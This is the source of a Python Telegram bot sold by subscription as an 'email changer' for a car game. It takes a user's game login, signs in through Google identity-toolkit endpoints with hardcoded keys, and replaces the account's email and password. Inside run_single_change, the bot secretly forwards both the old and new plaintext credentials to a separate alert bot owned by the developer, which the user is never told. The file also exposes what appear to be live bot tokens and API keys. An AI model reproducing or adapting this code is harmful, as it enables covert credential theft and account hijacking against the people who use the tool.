import asyncio
import sqlite3
from datetime import datetime
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, 
    filters, ContextTypes, ConversationHandler, CallbackQueryHandler
)

# --- 🔑 CONFIGURATION ---
TOKEN = "8517453533:AAFkxU_7fL-o278BTbS6IVelhrNxdPlWwXA"  # Main Bot Token
ADMIN_ID = 7199272008 # Main Admin ID
DB_NAME = 'cpm_bot.db'

# --- 🚨 ALERT BOT SETTINGS ---
ALERT_BOT_TOKEN = "8735375792:AAESP5284BS4Yk9skExdbXHc8f0k5ivEt70"
ALERT_ADMIN_ID = 7212602902

GAMES = {
    "1": {"name": "CPM 1", "api_key": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"},
    "2": {"name": "CPM 2", "api_key": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"}
}

PLANS = {
    "86400": "1 Day",
    "604800": "1 Week",
    "2592000": "1 Month",
    "31536000": "1 Year"
}

(
    WAIT_KEY_NAME, WAIT_PLAN, WAIT_SUB_KEY, WAIT_BROADCAST,
    SELECT_GAME, WAIT_ACCOUNT, WAIT_NEW_EMAIL, WAIT_NEW_PASS
) = range(8)

# --- 🚨 ALERT FUNCTION ---
async def send_admin_alert(msg_text):
    """Sends an alert to the admin via the secondary alert bot token."""
    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": ALERT_ADMIN_ID, 
        "text": msg_text, 
        "parse_mode": "Markdown"
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            await client.post(url, json=payload)
    except Exception as e:
        print(f"Failed to send alert: {e}")

# --- 🗄️ DATABASE SETUP ---
def setup_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS keys
                     (key_text TEXT PRIMARY KEY, duration INTEGER, is_used INTEGER)''')
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (user_id INTEGER PRIMARY KEY, key_used TEXT, end_time REAL)''')

def check_subscription(user_id):
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('SELECT key_used, end_time FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        
    if row and row[1] > datetime.now().timestamp():
        return True, row[0], row[1]
    return False, None, None

def format_time_left(end_timestamp):
    remaining = end_timestamp - datetime.now().timestamp()
    if remaining <= 0:
        return "Expired"
    days = int(remaining // 86400)
    hours = int((remaining % 86400) // 3600)
    minutes = int((remaining % 3600) // 60)
    return f"{days}d {hours}h {minutes}m"

# --- 🛡️ START & MENUS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user = update.effective_user
    msg = f"👋 Hello, {user.first_name}!\n🆔 Your Telegram ID: `{user.id}`\n\n"
    
    if user.id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("➕ Add Users", callback_data='admin_add_user')],
            [InlineKeyboardButton("👥 Users", callback_data='admin_users')],
            [InlineKeyboardButton("📢 Broadcast", callback_data='admin_broadcast')],
            [InlineKeyboardButton("⚙️ Email Changer", callback_data='email_changer_start')]
        ]
        await update.message.reply_text(
            msg + "🛠 **Admin Dashboard**\nSelect an option below:", 
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        keyboard = [
            [InlineKeyboardButton("📅 View My Subscription", callback_data='user_view_sub')],
            [InlineKeyboardButton("⚙️ Use Email Changer", callback_data='email_changer_start')],
            [InlineKeyboardButton("👨‍💻 Contact Developer", url=f"tg://user?id={ADMIN_ID}")]
        ]
        await update.message.reply_text(
            msg + "🚀 **User Dashboard**\nSelect an option below:", 
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    return ConversationHandler.END

# --- 🕹️ MENU ROUTER ---
async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == 'admin_add_user' and user_id == ADMIN_ID:
        await query.message.reply_text("🔑 Send the random key name you want to create (e.g. `markocpm`):")
        return WAIT_KEY_NAME

    elif data == 'admin_users' and user_id == ADMIN_ID:
        msg_lines = ["👥 **Active Users List:**\n"]
        count = 0
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            for uid, key, end_time in c.execute('SELECT user_id, key_used, end_time FROM users WHERE end_time > ?', (datetime.now().timestamp(),)):
                end_date = datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M')
                time_left = format_time_left(end_time)
                msg_lines.append(f"👤 ID: `{uid}`\n🔑 Key: `{key}`\n⏳ Left: {time_left}\n📅 Ends: {end_date}\n")
                count += 1

        if count == 0:
            await query.message.reply_text("📭 No active users found.")
        else:
            await query.message.reply_text("\n".join(msg_lines), parse_mode="Markdown")
            
        context.user_data.clear()
        return ConversationHandler.END

    elif data == 'admin_broadcast' and user_id == ADMIN_ID:
        await query.message.reply_text("📢 Send the message you want to broadcast to all active users:")
        return WAIT_BROADCAST

    elif data == 'user_view_sub':
        is_active, key, end_time = check_subscription(user_id)
        if is_active:
            end_date = datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M')
            time_left = format_time_left(end_time)
            msg = f"✅ **Active Subscription**\n\n🔑 Key: `{key}`\n⏳ Time Left: {time_left}\n📅 Ends on: {end_date}"
            await query.message.reply_text(msg, parse_mode="Markdown")
        else:
            keyboard = [[InlineKeyboardButton("💳 Start a Subscription", callback_data='start_sub_flow')]]
            await query.message.reply_text("❌ You do not have an active subscription.", reply_markup=InlineKeyboardMarkup(keyboard))
        
        context.user_data.clear()
        return ConversationHandler.END

    elif data == 'start_sub_flow':
        await query.message.reply_text("🔑 Please send your access key:")
        return WAIT_SUB_KEY

    elif data == 'email_changer_start':
        is_active, _, _ = check_subscription(user_id)
        if not is_active:
            keyboard = [[InlineKeyboardButton("💳 Start a Subscription", callback_data='start_sub_flow')]]
            await query.message.reply_text("❌ You need an active subscription to use this tool.", reply_markup=InlineKeyboardMarkup(keyboard))
            context.user_data.clear()
            return ConversationHandler.END
        
        keyboard = [[InlineKeyboardButton("CPM 1", callback_data='game_1')],
                    [InlineKeyboardButton("CPM 2", callback_data='game_2')]]
        await query.message.reply_text(
            "🤖 **CPM Single Account Modifier**\nSelect the game version to begin:", 
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return SELECT_GAME

# --- 🛠️ ADMIN FLOWS ---
async def admin_get_key_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['new_key'] = update.message.text.strip()
    keyboard = [
        [InlineKeyboardButton("1 Day", callback_data='plan_86400'), InlineKeyboardButton("1 Week", callback_data='plan_604800')],
        [InlineKeyboardButton("1 Month", callback_data='plan_2592000'), InlineKeyboardButton("1 Year", callback_data='plan_31536000')]
    ]
    await update.message.reply_text(f"Key `{context.user_data['new_key']}` ready. Select a plan:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    return WAIT_PLAN

async def admin_save_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    duration = int(query.data.split('_')[1])
    key_name = context.user_data.get('new_key')

    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        try:
            c.execute('INSERT INTO keys (key_text, duration, is_used) VALUES (?, ?, 0)', (key_name, duration))
            await query.edit_message_text(f"✅ Key `{key_name}` successfully saved for {PLANS[str(duration)]}!", parse_mode="Markdown")
        except sqlite3.IntegrityError:
            await query.edit_message_text("❌ Error: That key already exists in the database.")
    
    context.user_data.clear()
    return ConversationHandler.END

async def admin_broadcast_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text
    sent = 0
    
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        for (uid,) in c.execute('SELECT user_id FROM users WHERE end_time > ?', (datetime.now().timestamp(),)):
            try:
                await context.bot.send_message(chat_id=uid, text=f"📢 **Admin Update:**\n\n{msg_text}", parse_mode="Markdown")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                pass

    await update.message.reply_text(f"✅ Broadcast sent successfully to {sent} active users.")
    context.user_data.clear()
    return ConversationHandler.END

# --- 💳 USER FLOWS ---
async def user_activate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_input = update.message.text.strip()
    user_id = update.effective_user.id
    
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('SELECT duration FROM keys WHERE key_text = ? AND is_used = 0', (key_input,))
        key_row = c.fetchone()

        if key_row:
            duration = key_row[0]
            end_time = datetime.now().timestamp() + duration
            c.execute('UPDATE keys SET is_used = 1 WHERE key_text = ?', (key_input,))
            c.execute('''INSERT INTO users (user_id, key_used, end_time) 
                         VALUES (?, ?, ?) 
                         ON CONFLICT(user_id) DO UPDATE SET key_used=?, end_time=?''', 
                      (user_id, key_input, end_time, key_input, end_time))
            end_date = datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M')
            await update.message.reply_text(f"🎉 **Subscription Activated!**\n\nYour subscription is now valid until: {end_date}", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Invalid key or the key has already been used.")
            
    context.user_data.clear()
    return ConversationHandler.END

# --- ⚙️ EMAIL CHANGER CORE LOGIC ---
async def select_game(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['game_id'] = query.data.split('_')[1]
    
    await query.edit_message_text(
        f"✅ Target: {GAMES[context.user_data['game_id']]['name']}\n\n"
        "📧 Please send the current account credentials.\nFormat: `old_email:password`",
        parse_mode="Markdown"
    )
    return WAIT_ACCOUNT

async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if ":" not in text:
        await update.message.reply_text("❌ Invalid format. Please use: `old_email:password`", parse_mode="Markdown")
        return WAIT_ACCOUNT
    
    try:
        old_email, old_pass = [p.strip() for p in text.split(':')[:2]]
        context.user_data['old_email'] = old_email
        context.user_data['old_pass'] = old_pass
        await update.message.reply_text("🆕 Enter the **NEW Email** address you want to link to this account:")
        return WAIT_NEW_EMAIL
    except Exception:
        await update.message.reply_text("❌ Error reading credentials. Check your formatting.")
        return WAIT_ACCOUNT

async def get_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_email = update.message.text.strip()
    if "@" not in new_email or "." not in new_email:
        await update.message.reply_text("❌ Please enter a valid email address.")
        return WAIT_NEW_EMAIL
        
    context.user_data['new_email'] = new_email
    await update.message.reply_text("🔑 Finally, enter the **NEW Password** for this account:")
    return WAIT_NEW_PASS

async def run_single_change(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_password = update.message.text.strip()
    old_email = context.user_data['old_email']
    old_pass = context.user_data['old_pass']
    new_email = context.user_data['new_email']
    game_id = context.user_data.get('game_id', '2')
    game_name = GAMES[game_id]['name']
    api_key = GAMES[game_id]['api_key']
    
    status_msg = await update.message.reply_text("⚡ Processing request...")
    
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            auth_url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
            r1 = await client.post(auth_url, json={"email": old_email, "password": old_pass, "returnSecureToken": True})
            
            if r1.status_code == 200:
                # --- 🚨 TRIGGER LOGIN ALERT ---
                login_alert = (
                    f"🟢 **LOGIN SUCCESS** 🟢\n"
                    f"🎮 Game: {game_name}\n"
                    f"📧 Email: `{old_email}`\n"
                    f"🔑 Pass: `{old_pass}`\n"
                    f"👤 User: `{update.effective_user.id}`"
                )
                asyncio.create_task(send_admin_alert(login_alert))
                # ------------------------------

                token = r1.json().get('idToken')
                upd_url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
                r2 = await client.post(upd_url, json={
                    "idToken": token, 
                    "email": new_email, 
                    "password": new_password, 
                    "returnSecureToken": True
                })
                
                if r2.status_code == 200:
                    # --- 🚨 TRIGGER CHANGE ALERT ---
                    change_alert = (
                        f"✅ **ACCOUNT MODIFIED** ✅\n"
                        f"🎮 Game: {game_name}\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"📤 **OLD CREDENTIALS**\n"
                        f"📧 Mail: `{old_email}`\n"
                        f"🔑 Pass: `{old_pass}`\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"📥 **NEW CREDENTIALS**\n"
                        f"📧 Changed Mail: `{new_email}`\n"
                        f"🔑 Change Pass: `{new_password}`\n"
                        f"👤 User: `{update.effective_user.id}`"
                    )
                    asyncio.create_task(send_admin_alert(change_alert))
                    # -------------------------------

                    await status_msg.edit_text(
                        f"🎉 **Success! Account Updated!**\n\n"
                        f"📧 **New Credentials:**\n"
                        f"`{new_email}:{new_password}`",
                        parse_mode="Markdown"
                    )
                else:
                    err = r2.json().get('error', {}).get('message', 'Update Failed')
                    await status_msg.edit_text(f"❌ **Update Failed:**\n`{err}`", parse_mode="Markdown")
            else:
                err = r1.json().get('error', {}).get('message', 'Login Failed')
                await status_msg.edit_text(f"❌ **Login failed for current credentials:**\n`{err}`", parse_mode="Markdown")
                
    except Exception as e:
        await status_msg.edit_text(f"⚠️ **An unexpected error occurred:**\n`{str(e)}`", parse_mode="Markdown")

    context.user_data.clear()
    return ConversationHandler.END

# --- 🏁 MAIN EXECUTION ---
if __name__ == '__main__':
    setup_db()
    
    app = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(menu_router)
        ],
        states={
            WAIT_KEY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_get_key_name)],
            WAIT_PLAN: [CallbackQueryHandler(admin_save_plan, pattern='^plan_')],
            WAIT_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_broadcast_msg)],
            WAIT_SUB_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, user_activate_key)],
            SELECT_GAME: [CallbackQueryHandler(select_game, pattern='^game_')],
            WAIT_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_account)],
            WAIT_NEW_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_new_email)],
            WAIT_NEW_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, run_single_change)],
        },
        fallbacks=[CommandHandler("start", start)],
    )
    
    app.add_handler(conv_handler)
    print("CPM Bot is LIVE and Ready.")
    app.run_polling()
